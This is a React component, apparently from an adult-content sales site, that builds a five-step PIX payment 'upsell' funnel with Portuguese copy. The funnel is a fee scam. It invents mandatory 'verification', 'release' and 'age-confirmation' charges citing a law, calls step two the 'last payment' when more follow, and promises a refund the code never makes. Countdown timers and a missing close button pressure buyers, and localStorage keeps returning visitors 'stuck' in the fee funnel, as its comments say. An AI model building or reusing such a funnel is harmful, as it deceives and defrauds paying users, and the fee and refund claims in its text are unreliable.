'use client'

import { useState, useEffect, useRef } from 'react'
import { trackEvent } from '@/lib/tiktok-pixel'
import { trackFunnel } from '@/lib/funnel'

export type FunnelStep = 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4' | 'upsell5' | 'final'

interface Props {
  onClose: () => void
  initialStep?: FunnelStep
}
type QrStep = 'offer' | 'loading' | 'qr'

interface PixData {
  id: string
  pix_copia_cola: string
}

const VIP_URL =
  process.env.NEXT_PUBLIC_VIP_GROUP_URL ?? 'https://t.me/liberarconteudoverificadobot'

function fmt(n: number) {
  return n.toFixed(2).replace('.', ',')
}

function useCountdown(initial: number) {
  const [t, setT] = useState(initial)
  useEffect(() => {
    const id = setInterval(() => setT((s) => Math.max(0, s - 1)), 1000)
    return () => clearInterval(id)
  }, [])
  const m = String(Math.floor(t / 60)).padStart(2, '0')
  const s = String(t % 60).padStart(2, '0')
  return `${m}:${s}`
}

const Check = () => (
  <svg viewBox="0 0 24 24" fill="none" className="w-4 h-4 flex-shrink-0">
    <path d="M5 13l4 4L19 7" stroke="#22c55e" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
  </svg>
)

const Shield = () => (
  <svg viewBox="0 0 24 24" fill="none" className="w-3.5 h-3.5">
    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="#22c55e" />
  </svg>
)

export default function UpsellFunnel({ onClose, initialStep }: Props) {
  const [funnel, setFunnel] = useState<FunnelStep>(initialStep ?? 'upsell1')
  const [qrStep, setQrStep] = useState<QrStep>('offer')
  const [extra1, setExtra1] = useState(false)
  const [extra2, setExtra2] = useState(false)
  const [extra4, setExtra4] = useState(false)
  const [extra5, setExtra5] = useState(false)
  const [pixData, setPixData] = useState<PixData | null>(null)
  const [copied, setCopied] = useState(false)
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null)
  // Transações já confirmadas — evita o setInterval async disparar
  // o "pago" mais de uma vez (callbacks em voo antes do clearInterval).
  const paidIdsRef = useRef<Set<string>>(new Set())
  const countdown = useCountdown(5 * 60)

  const u1Total = 6.5 + (extra1 ? 7 : 0)
  const u2Total = 12.53 + (extra2 ? 14 : 0)
  const u3Total = 12.9 // Verificação Final Obrigatória (sem order bump)
  const u4Total = 20 + (extra4 ? 5.4 : 0) // Acesso VIP Completo (+ Pack Secreto)
  const u5Total = 30 + (extra5 ? 9.9 : 0) // Taxa Reembolsável (+ Seguro de Acesso)

  useEffect(() => {
    document.body.style.overflow = 'hidden'
    return () => {
      document.body.style.overflow = ''
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [])

  // Conta quantos leads chegam em cada etapa do funil de upsell.
  // funnel só avança (upsell1 → upsell2 → final), então cada valor
  // dispara uma vez.
  useEffect(() => {
    if (funnel === 'upsell1') trackFunnel('upsell1_view')
    else if (funnel === 'upsell2') trackFunnel('upsell2_view')
    else if (funnel === 'upsell3') trackFunnel('upsell3_view')
    else if (funnel === 'upsell4') trackFunnel('upsell4_view')
    else if (funnel === 'upsell5') trackFunnel('upsell5_view')
    else if (funnel === 'final') trackFunnel('funnel_complete')

    // Persiste o passo: se o lead recarregar a página, ele volta
    // preso no funil de taxas no ponto onde parou. Ao concluir
    // (final), limpa — funil terminado, não prende mais.
    try {
      if (funnel === 'final') localStorage.removeItem('mv_upsell')
      else localStorage.setItem('mv_upsell', funnel)
    } catch {}
  }, [funnel])

  // Config de cada taxa (upsell). Mantém o tracking e as transições
  // em um único lugar — fácil adicionar/editar etapas.
  const STEP = {
    upsell1: { value: u1Total, cid: 'upsell-verificacao', cname: 'Verificação Obrigatória', paid: 'upsell1_paid' as const, next: 'upsell2' as FunnelStep },
    upsell2: { value: u2Total, cid: 'upsell-liberacao', cname: 'Taxa de Liberação de Uso', paid: 'upsell2_paid' as const, next: 'upsell3' as FunnelStep },
    upsell3: { value: u3Total, cid: 'upsell-final', cname: 'Verificação Final Obrigatória', paid: 'upsell3_paid' as const, next: 'upsell4' as FunnelStep },
    upsell4: { value: u4Total, cid: 'upsell-vip', cname: 'Acesso VIP Completo', paid: 'upsell4_paid' as const, next: 'upsell5' as FunnelStep },
    upsell5: { value: u5Total, cid: 'upsell-reembolsavel', cname: 'Taxa Reembolsável', paid: 'upsell5_paid' as const, next: 'final' as FunnelStep },
  }

  // Trata a confirmação de uma transação. Roda 1x por txid (guard),
  // então serve tanto pro polling quanto pra checagem ao reabrir a
  // página (pagamento feito fora do site).
  function confirmPaid(txid: string) {
    if (paidIdsRef.current.has(txid)) return
    paidIdsRef.current.add(txid)
    if (pollRef.current) clearInterval(pollRef.current)

    const cfg = STEP[funnel as 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4' | 'upsell5']
    if (!cfg) return
    trackEvent({
      event: 'Purchase',
      value: cfg.value,
      content_id: cfg.cid,
      content_name: cfg.cname,
      order_id: txid,
      event_id: `purchase_${txid}`,
    })
    trackFunnel(cfg.paid)
    if (funnel === 'upsell1' && extra1) trackFunnel('bump_whatsapp')   // order bump U1
    if (funnel === 'upsell2' && extra2) trackFunnel('bump_calcinha')  // order bump U2
    if (funnel === 'upsell4' && extra4) trackFunnel('bump_packsecreto') // order bump U4
    if (funnel === 'upsell5' && extra5) trackFunnel('bump_segurovip')   // order bump U5
    try { localStorage.removeItem('mv_upsell_tx') } catch {}
    setFunnel(cfg.next); setQrStep('offer'); setPixData(null)
  }

  useEffect(() => {
    if (qrStep !== 'qr' || !pixData) return
    const id = pixData.id
    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/pix/status?id=${id}`)
        const d = await res.json()
        if (d.status === 'paid') confirmPaid(id)
      } catch {}
    }, 3000)
    return () => { if (pollRef.current) clearInterval(pollRef.current) }
  }, [qrStep, pixData, funnel])

  // Ao (re)abrir o modal: se havia um PIX pendente salvo para este
  // passo, verifica o status. Se já foi pago FORA do site, avança o
  // funil; se ainda não, volta pro QR e o polling continua nele.
  useEffect(() => {
    let saved: { step?: string; id?: string } | null = null
    try { saved = JSON.parse(localStorage.getItem('mv_upsell_tx') || 'null') } catch {}
    if (!saved || !saved.id || saved.step !== funnel) return
    const id = saved.id
    ;(async () => {
      try {
        const r = await fetch(`/api/pix/status?id=${id}`)
        const d = await r.json()
        if (d.status === 'paid') confirmPaid(id)
        else { setPixData({ id, pix_copia_cola: '' }); setQrStep('qr') }
      } catch {}
    })()
    // só na montagem
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  async function pay(amount: number, description: string) {
    setQrStep('loading')
    try {
      const res = await fetch('/api/pix/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount, description, external_id: `up-${Date.now()}` }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error()
      const txid = data.transaction.id
      setPixData({ id: txid, pix_copia_cola: data.transaction.pix_copia_cola })
      setQrStep('qr')
      // Guarda o PIX pendente: se ele pagar fora do site e recarregar,
      // a checagem na reabertura detecta e avança o funil.
      try { localStorage.setItem('mv_upsell_tx', JSON.stringify({ step: funnel, id: txid })) } catch {}

      // InitiateCheckout para cada taxa
      const cfg = STEP[funnel as 'upsell1' | 'upsell2' | 'upsell3' | 'upsell4' | 'upsell5']
      trackEvent({
        event: 'InitiateCheckout',
        value: amount,
        content_id: cfg ? cfg.cid : 'upsell',
        content_name: description,
        order_id: data.transaction.id,
      })
    } catch {
      setQrStep('offer')
    }
  }

  function copy() {
    if (!pixData) return
    navigator.clipboard.writeText(pixData.pix_copia_cola)
    setCopied(true)
    setTimeout(() => setCopied(false), 2500)
  }

  const TimerBar = ({ label }: { label: string }) => (
    <div className="bg-[#1a1f2e] px-4 py-2.5 flex items-center justify-between">
      <span className="text-white/70 text-xs flex items-center gap-1.5">
        <svg viewBox="0 0 24 24" fill="none" className="w-3.5 h-3.5">
          <circle cx="12" cy="12" r="9" stroke="white" strokeWidth="2" />
          <path d="M12 7v5l3 3" stroke="white" strokeWidth="2" strokeLinecap="round" />
        </svg>
        {label}
      </span>
      <span className="text-pink-400 font-bold text-sm">{countdown}</span>
    </div>
  )

  const QRScreen = ({ accentClass }: { accentClass: string }) => (
    <div className="bg-white px-5 pt-5 pb-5">
      <div className="flex justify-center mb-4">
        <div className="border border-gray-200 rounded-xl p-3 bg-white shadow-sm">
          <img
            src={`/api/pix/qr?id=${pixData!.id}`}
            alt="QR Code PIX"
            className="w-44 h-44 object-contain"
          />
        </div>
      </div>
      <div className="border border-gray-200 rounded-xl px-3 py-2.5 mb-3 bg-gray-50">
        <p className="text-[11px] text-gray-500 text-center break-all leading-relaxed line-clamp-3">
          {pixData!.pix_copia_cola}
        </p>
      </div>
      <button
        onClick={copy}
        className="w-full border border-gray-200 rounded-xl py-3 flex items-center justify-center gap-2 text-sm font-semibold text-gray-700 bg-white hover:bg-gray-50 active:scale-[0.98] transition-all mb-3"
      >
        {copied
          ? <span className="text-green-600">✓ Copiado!</span>
          : 'Copiar código PIX'}
      </button>
      <div className="flex items-center justify-center gap-2">
        <svg className={`w-5 h-5 animate-spin ${accentClass}`} viewBox="0 0 24 24" fill="none">
          <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeDasharray="28 56" />
        </svg>
        <span className={`text-sm font-bold ${accentClass}`}>Aguardando pagamento...</span>
      </div>
    </div>
  )

  const Footer = () => (
    <div className="flex items-center justify-center gap-6 mt-3">
      <span className="flex items-center gap-1.5 text-xs text-gray-500"><Shield />Pagamento seguro</span>
      <span className="flex items-center gap-1.5 text-xs text-gray-500"><Shield />Dados protegidos</span>
    </div>
  )

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm px-4">
      <div className="w-full max-w-[390px] rounded-3xl overflow-hidden shadow-2xl max-h-[90vh] overflow-y-auto">

        {/* ── UPSELL 1: Verificação Obrigatória ── */}
        {funnel === 'upsell1' && (
          <>
            <TimerBar label="Tempo restante para liberação:" />
            <div className="bg-gradient-to-r from-green-600 to-green-400 px-5 pt-4 pb-4 text-center">
              <p className="text-3xl mb-1">🛡️</p>
              <h2 className="text-white text-lg font-black mb-0.5">Verificação Obrigatória</h2>
              <p className="text-white/80 text-xs">Tarifa de Segurança do Dispositivo</p>
            </div>

            {qrStep === 'qr'
              ? <QRScreen accentClass="text-green-500" />
              : (
                <div className="bg-white px-5 pt-4 pb-5">
                  <p className="text-sm text-gray-700 mb-3 leading-relaxed">
                    Seu pagamento foi <strong>confirmado com sucesso</strong>!<br />
                    Para garantir a <strong>segurança e exclusividade</strong> do conteúdo, precisamos
                    verificar seu dispositivo. Essa tarifa impede acessos não autorizados e protege
                    contra vazamentos.
                  </p>
                  <ul className="space-y-1.5 mb-3">
                    {['Vincula seu dispositivo ao acesso VIP', 'Protege contra clonagem e vazamento', 'Verificação instantânea e automática'].map((b) => (
                      <li key={b} className="flex items-center gap-2 text-sm text-gray-700"><Check />{b}</li>
                    ))}
                  </ul>
                  <p className="text-center font-black text-green-500 text-4xl mb-3">R$ {fmt(u1Total)}</p>
                  <div className="border border-green-200 bg-green-50 rounded-xl px-3 py-2 mb-3 text-center">
                    <p className="text-xs text-green-700 font-semibold">⚠ Sem esta verificação, seu acesso não será liberado.</p>
                  </div>
                  <div className="relative mb-3">
                    <span className="absolute -top-2.5 left-3 bg-green-500 text-white text-[9px] font-black px-2 py-0.5 rounded-full uppercase tracking-wide z-10">
                      Oferta especial
                    </span>
                    <label
                      className="flex items-center gap-3 border-2 border-dashed border-green-400 rounded-xl px-3 pt-4 pb-3 bg-green-50 cursor-pointer"
                      onClick={() => setExtra1(!extra1)}
                    >
                      <div className={`w-5 h-5 rounded flex-shrink-0 border-2 flex items-center justify-center transition-colors ${extra1 ? 'bg-green-500 border-green-500' : 'border-gray-300 bg-white'}`}>
                        {extra1 && <svg viewBox="0 0 24 24" fill="none" className="w-3 h-3"><path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg>}
                      </div>
                      <div>
                        <p className="text-sm font-bold text-gray-900 leading-tight">💬 Meu WhatsApp Pessoal</p>
                        <p className="text-sm font-black text-green-500 leading-tight">+ R$ 7,00</p>
                        <p className="text-[11px] text-gray-500 leading-tight">Converse comigo diretamente no WhatsApp</p>
                      </div>
                    </label>
                  </div>
                  <p className="text-center text-sm text-gray-600 mb-3">
                    Total: <span className="font-black text-gray-900">R$ {fmt(u1Total)}</span>
                  </p>
                  <button
                    onClick={() => pay(u1Total, 'Verificação Obrigatória')}
                    disabled={qrStep === 'loading'}
                    className="w-full bg-gradient-to-r from-green-600 to-green-400 text-white font-black text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2 shadow-lg shadow-green-200/60 active:scale-[0.98] transition-transform disabled:opacity-70"
                  >
                    {qrStep === 'loading' ? 'Gerando PIX...' : `🔒 Liberar dispositivo por R$ ${fmt(u1Total)}`}
                  </button>
                  <Footer />
                </div>
              )
            }
          </>
        )}

        {/* ── UPSELL 2: Última Etapa ── */}
        {funnel === 'upsell2' && (
          <>
            <TimerBar label="Tempo restante:" />
            <div className="bg-gradient-to-r from-pink-600 to-pink-400 px-5 pt-4 pb-4 text-center">
              <p className="text-3xl mb-1">⬇️</p>
              <h2 className="text-white text-lg font-black mb-0.5">Última Etapa</h2>
              <p className="text-white/80 text-xs">Taxa de Liberação de Uso</p>
            </div>

            {qrStep === 'qr'
              ? <QRScreen accentClass="text-pink-500" />
              : (
                <div className="bg-white px-5 pt-4 pb-5">
                  <p className="text-sm text-gray-700 mb-3 leading-relaxed">
                    Dispositivo <strong>verificado com sucesso</strong>!<br />
                    Esta é a <strong>última etapa</strong> e o <strong>último pagamento</strong>. A Taxa de
                    Liberação de Uso garante seu direito de acessar e baixar todo o conteúdo exclusivo
                    do canal VIP.
                  </p>
                  <ul className="space-y-1.5 mb-3">
                    {['Liberação completa de downloads', 'Acesso sem restrições ao conteúdo', 'Direito de uso pessoal das mídias'].map((b) => (
                      <li key={b} className="flex items-center gap-2 text-sm text-gray-700"><Check />{b}</li>
                    ))}
                  </ul>
                  <p className="text-center font-black text-pink-500 text-4xl mb-3">R$ {fmt(u2Total)}</p>
                  <div className="border border-pink-200 bg-pink-50 rounded-xl px-3 py-2 mb-3 text-center">
                    <p className="text-xs text-pink-700 font-semibold">⚠ Esta é a última etapa. Após isso, acesso total liberado.</p>
                  </div>
                  <div className="relative mb-3">
                    <span className="absolute -top-2.5 left-3 bg-pink-500 text-white text-[9px] font-black px-2 py-0.5 rounded-full uppercase tracking-wide z-10">
                      Oferta especial
                    </span>
                    <label
                      className="flex items-center gap-3 border-2 border-dashed border-pink-400 rounded-xl px-3 pt-4 pb-3 bg-pink-50 cursor-pointer"
                      onClick={() => setExtra2(!extra2)}
                    >
                      <div className={`w-5 h-5 rounded flex-shrink-0 border-2 flex items-center justify-center transition-colors ${extra2 ? 'bg-pink-500 border-pink-500' : 'border-gray-300 bg-white'}`}>
                        {extra2 && <svg viewBox="0 0 24 24" fill="none" className="w-3 h-3"><path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg>}
                      </div>
                      <div>
                        <p className="text-sm font-bold text-gray-900 leading-tight">🎁 Minha Calcinha Usada</p>
                        <p className="text-sm font-black text-pink-500 leading-tight">+ R$ 14,00</p>
                        <p className="text-[11px] text-gray-500 leading-tight">Enviada na hora, discreta e bem molhadinha</p>
                      </div>
                    </label>
                  </div>
                  <p className="text-center text-sm text-gray-600 mb-3">
                    Total: <span className="font-black text-gray-900">R$ {fmt(u2Total)}</span>
                  </p>
                  <button
                    onClick={() => pay(u2Total, 'Taxa de Liberação de Uso')}
                    disabled={qrStep === 'loading'}
                    className="w-full bg-gradient-to-r from-pink-600 to-pink-400 text-white font-black text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2 shadow-lg shadow-pink-200/60 active:scale-[0.98] transition-transform disabled:opacity-70"
                  >
                    {qrStep === 'loading' ? 'Gerando PIX...' : 'Ativar liberação de uso ✅'}
                  </button>
                  <Footer />
                </div>
              )
            }
          </>
        )}

        {/* ── UPSELL 3: Verificação Final Obrigatória (Lei Felca) ── */}
        {funnel === 'upsell3' && (
          <>
            <TimerBar label="Tempo restante:" />
            <div className="bg-gradient-to-r from-red-600 to-red-500 px-5 pt-4 pb-4 text-center">
              <p className="text-3xl mb-1">⚠️</p>
              <h2 className="text-white text-lg font-black mb-0.5">Verificação Final Obrigatória</h2>
              <p className="text-white/80 text-xs">Seu dispositivo foi validado com sucesso ✅</p>
            </div>

            {qrStep === 'qr'
              ? <QRScreen accentClass="text-red-500" />
              : (
                <div className="bg-white px-5 pt-4 pb-5">
                  <img
                    src="/media/anexo_1.jpg"
                    alt="Aviso Lei Felca"
                    className="w-full rounded-xl mb-3 border border-gray-200"
                    onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = 'none' }}
                  />
                  <p className="text-sm text-gray-700 mb-3 leading-relaxed">
                    Para liberar seu acesso <strong>+18</strong>, o sistema exige uma última
                    confirmação de maioridade conforme protocolo da <strong>Lei Felca
                    (Lei nº 15.211)</strong>.<br />
                    Essa ativação vincula seu aparelho ao acesso privado e impede
                    compartilhamentos, vazamentos e bloqueios automáticos do sistema.
                  </p>
                  <ul className="space-y-1.5 mb-3">
                    {['Liberação imediata do VIP', 'Acesso privado e sigiloso', 'Proteção contra bloqueios', 'Conteúdos ocultos liberados 🔥', 'Taxa 100% reembolsável pelo banco em até 7 dias úteis'].map((b) => (
                      <li key={b} className="flex items-center gap-2 text-sm text-gray-700"><Check />{b}</li>
                    ))}
                  </ul>
                  <p className="text-center text-xs text-gray-500 mb-0.5">💎 Taxa simbólica de ativação:</p>
                  <p className="text-center font-black text-red-500 text-4xl mb-3">R$ {fmt(u3Total)}</p>
                  <div className="border border-red-200 bg-red-50 rounded-xl px-3 py-2 mb-3 text-center">
                    <p className="text-xs text-red-700 font-semibold">⏳ Sem essa confirmação, seu acesso permanece bloqueado.</p>
                  </div>
                  <button
                    onClick={() => pay(u3Total, 'Verificação Final Obrigatória')}
                    disabled={qrStep === 'loading'}
                    className="w-full bg-gradient-to-r from-red-600 to-red-500 text-white font-black text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2 shadow-lg shadow-red-200/60 active:scale-[0.98] transition-transform disabled:opacity-70"
                  >
                    {qrStep === 'loading' ? 'Gerando PIX...' : 'Confirmar maioridade e liberar acesso ✅'}
                  </button>
                  <Footer />
                </div>
              )
            }
          </>
        )}

        {/* ── UPSELL 4: Conteúdo Privado Detectado (Acesso VIP) ── */}
        {funnel === 'upsell4' && (
          <>
            <TimerBar label="Tempo restante:" />
            <div className="bg-gradient-to-r from-violet-600 to-violet-500 px-5 pt-4 pb-4 text-center">
              <p className="text-3xl mb-1">🔐</p>
              <h2 className="text-white text-lg font-black mb-0.5">Conteúdo Privado Detectado</h2>
              <p className="text-white/80 text-xs">Acesso restrito do VIP identificado</p>
            </div>

            {qrStep === 'qr'
              ? <QRScreen accentClass="text-violet-500" />
              : (
                <div className="bg-white px-5 pt-4 pb-5">
                  <video
                    src="/media/anexo_2.mp4"
                    autoPlay
                    muted
                    loop
                    playsInline
                    className="w-full rounded-xl mb-3 border border-gray-200"
                    onError={(e) => { (e.currentTarget as HTMLVideoElement).style.display = 'none' }}
                  />
                  <p className="text-sm text-gray-700 mb-3 leading-relaxed">
                    O sistema identificou que este acesso contém <strong>pastas privadas</strong> e
                    conteúdos restritos do VIP. Por motivos de sigilo, segurança e proteção contra
                    vazamentos, é necessária uma <strong>ativação única</strong> para desbloqueio
                    completo do acervo.
                  </p>
                  <p className="text-sm font-bold text-gray-900 mb-2">🎯 Escolha como deseja acessar:</p>

                  {/* Acesso limitado (recusa) */}
                  <div className="border border-gray-200 rounded-xl px-3 py-2.5 mb-3 bg-gray-50">
                    <p className="text-sm font-bold text-gray-500 mb-1">📂 Acesso Limitado</p>
                    <ul className="space-y-1">
                      {['Apenas parte dos conteúdos liberados', 'Sem atualizações automáticas', 'Recursos privados bloqueados'].map((b) => (
                        <li key={b} className="text-[12px] text-gray-400 leading-tight">• {b}</li>
                      ))}
                    </ul>
                  </div>

                  {/* Acesso VIP completo */}
                  <div className="border-2 border-violet-400 rounded-xl px-3 py-3 mb-3 bg-violet-50">
                    <p className="text-sm font-black text-violet-700 mb-1.5">💎 Acesso VIP Completo</p>
                    <ul className="space-y-1.5">
                      {['Todas as pastas liberadas 🔥', 'Conteúdos exclusivos e raros', 'Downloads ilimitados', 'Atualizações diárias automáticas', 'Pedidos especiais desbloqueados', 'Bônus secretos liberados 🎁'].map((b) => (
                        <li key={b} className="flex items-center gap-2 text-sm text-gray-700"><Check />{b}</li>
                      ))}
                    </ul>
                  </div>

                  {/* Order bump */}
                  <div className="relative mb-3">
                    <span className="absolute -top-2.5 left-3 bg-violet-500 text-white text-[9px] font-black px-2 py-0.5 rounded-full uppercase tracking-wide z-10">
                      Oferta especial
                    </span>
                    <label
                      className="flex items-center gap-3 border-2 border-dashed border-violet-400 rounded-xl px-3 pt-4 pb-3 bg-violet-50 cursor-pointer"
                      onClick={() => setExtra4(!extra4)}
                    >
                      <div className={`w-5 h-5 rounded flex-shrink-0 border-2 flex items-center justify-center transition-colors ${extra4 ? 'bg-violet-500 border-violet-500' : 'border-gray-300 bg-white'}`}>
                        {extra4 && <svg viewBox="0 0 24 24" fill="none" className="w-3 h-3"><path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg>}
                      </div>
                      <div>
                        <p className="text-sm font-bold text-gray-900 leading-tight">🎁 Pack Secreto +18</p>
                        <p className="text-sm font-black text-violet-600 leading-tight">+ R$ 5,40</p>
                        <p className="text-[11px] text-gray-500 leading-tight">+300 mídias proibidas que não entram no VIP</p>
                      </div>
                    </label>
                  </div>

                  <p className="text-center text-sm text-gray-600 mb-3">
                    Total: <span className="font-black text-gray-900">R$ {fmt(u4Total)}</span>
                  </p>
                  <button
                    onClick={() => pay(u4Total, 'Acesso VIP Completo')}
                    disabled={qrStep === 'loading'}
                    className="w-full bg-gradient-to-r from-violet-600 to-violet-500 text-white font-black text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2 shadow-lg shadow-violet-200/60 active:scale-[0.98] transition-transform disabled:opacity-70"
                  >
                    {qrStep === 'loading' ? 'Gerando PIX...' : '💎 Ativar Acesso VIP Completo'}
                  </button>
                  <div className="border border-gray-200 bg-gray-50 rounded-xl px-3 py-2 mt-3 text-center">
                    <p className="text-[11px] text-gray-500">🔒 Conteúdo privado e sigiloso. Compartilhamentos indevidos resultam em bloqueio permanente do acesso.</p>
                  </div>
                  <Footer />
                </div>
              )
            }
          </>
        )}

        {/* ── UPSELL 5: Taxa 100% Reembolsável ── */}
        {funnel === 'upsell5' && (
          <>
            <TimerBar label="Tempo restante:" />
            <div className="bg-gradient-to-r from-blue-600 to-blue-500 px-5 pt-4 pb-4 text-center">
              <p className="text-3xl mb-1">💰</p>
              <h2 className="text-white text-lg font-black mb-0.5">Taxa 100% Reembolsável</h2>
              <p className="text-white/80 text-xs">Seu valor volta integral em até 7 dias úteis</p>
            </div>

            {qrStep === 'qr'
              ? <QRScreen accentClass="text-blue-500" />
              : (
                <div className="bg-white px-5 pt-4 pb-5">
                  <img
                    src="/media/anexo_3.jpg"
                    alt="Taxa Reembolsável"
                    className="w-full rounded-xl mb-3 border border-gray-200"
                    onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = 'none' }}
                  />
                  <p className="text-sm text-gray-700 mb-3 leading-relaxed">
                    Esta é uma <strong>taxa única de garantia</strong> exigida pelo sistema
                    antifraude para confirmar que você é o titular do pagamento. O valor é
                    <strong> 100% reembolsável</strong>: assim que o acesso é validado, ele
                    retorna <strong>integralmente</strong> para a sua conta em até 7 dias
                    úteis, direto pelo banco.
                  </p>
                  <ul className="space-y-1.5 mb-3">
                    {['Valor devolvido 100% em até 7 dias úteis', 'Confirma a titularidade e libera o acesso na hora', 'Proteção antifraude e antibloqueio', 'Acesso vitalício garantido após a validação'].map((b) => (
                      <li key={b} className="flex items-center gap-2 text-sm text-gray-700"><Check />{b}</li>
                    ))}
                  </ul>
                  <p className="text-center text-xs text-gray-500 mb-0.5">💎 Taxa reembolsável:</p>
                  <p className="text-center font-black text-blue-600 text-4xl mb-1">R$ {fmt(u5Total)}</p>
                  <div className="border border-blue-200 bg-blue-50 rounded-xl px-3 py-2 mb-3 text-center">
                    <p className="text-xs text-blue-700 font-semibold">🔒 Reembolso garantido — é só uma verificação, o valor volta pra você.</p>
                  </div>

                  {/* Order bump */}
                  <div className="relative mb-3">
                    <span className="absolute -top-2.5 left-3 bg-blue-500 text-white text-[9px] font-black px-2 py-0.5 rounded-full uppercase tracking-wide z-10">
                      Oferta especial
                    </span>
                    <label
                      className="flex items-center gap-3 border-2 border-dashed border-blue-400 rounded-xl px-3 pt-4 pb-3 bg-blue-50 cursor-pointer"
                      onClick={() => setExtra5(!extra5)}
                    >
                      <div className={`w-5 h-5 rounded flex-shrink-0 border-2 flex items-center justify-center transition-colors ${extra5 ? 'bg-blue-500 border-blue-500' : 'border-gray-300 bg-white'}`}>
                        {extra5 && <svg viewBox="0 0 24 24" fill="none" className="w-3 h-3"><path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" /></svg>}
                      </div>
                      <div>
                        <p className="text-sm font-bold text-gray-900 leading-tight">🛡️ Seguro de Acesso Vitalício</p>
                        <p className="text-sm font-black text-blue-600 leading-tight">+ R$ 9,90</p>
                        <p className="text-[11px] text-gray-500 leading-tight">Se o link cair ou for bloqueado, reativamos seu acesso na hora — pra sempre</p>
                      </div>
                    </label>
                  </div>

                  <p className="text-center text-sm text-gray-600 mb-3">
                    Total: <span className="font-black text-gray-900">R$ {fmt(u5Total)}</span>
                  </p>
                  <button
                    onClick={() => pay(u5Total, 'Taxa Reembolsável')}
                    disabled={qrStep === 'loading'}
                    className="w-full bg-gradient-to-r from-blue-600 to-blue-500 text-white font-black text-sm py-3.5 rounded-2xl flex items-center justify-center gap-2 shadow-lg shadow-blue-200/60 active:scale-[0.98] transition-transform disabled:opacity-70"
                  >
                    {qrStep === 'loading' ? 'Gerando PIX...' : '💰 Pagar taxa reembolsável e liberar'}
                  </button>
                  <Footer />
                </div>
              )
            }
          </>
        )}

        {/* ── FINAL: Acesso Liberado ── */}
        {funnel === 'final' && (
          <>
            <div className="relative bg-gradient-to-br from-teal-500 to-green-400 px-5 pt-8 pb-6 text-center">
              <button
                onClick={onClose}
                className="absolute top-3 right-3 w-7 h-7 rounded-full bg-white/20 flex items-center justify-center text-white hover:bg-white/30 transition-colors"
              >
                <svg viewBox="0 0 24 24" fill="none" className="w-3.5 h-3.5">
                  <path d="M18 6L6 18M6 6l12 12" stroke="white" strokeWidth="2.5" strokeLinecap="round" />
                </svg>
              </button>
              <div className="w-16 h-16 rounded-full bg-white/30 flex items-center justify-center mx-auto mb-3">
                <svg viewBox="0 0 24 24" fill="none" className="w-9 h-9">
                  <path d="M5 13l4 4L19 7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
              <h2 className="text-white text-xl font-black mb-1">Acesso Liberado!</h2>
              <p className="text-white/80 text-sm">Todas as verificações foram concluídas</p>
            </div>
            <div className="bg-white px-5 py-6 text-center">
              <p className="text-sm text-gray-600 mb-5">
                Parabéns! Seu acesso completo está liberado. Clique no botão abaixo para entrar no grupo VIP.
              </p>
              <a
                href={VIP_URL}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center justify-center gap-2 w-full bg-gradient-to-r from-teal-500 to-green-400 text-white font-black text-base py-4 rounded-2xl shadow-lg active:scale-[0.98] transition-transform"
              >
                ✈ Entrar no Grupo VIP
              </a>
            </div>
          </>
        )}

      </div>
    </div>
  )
}
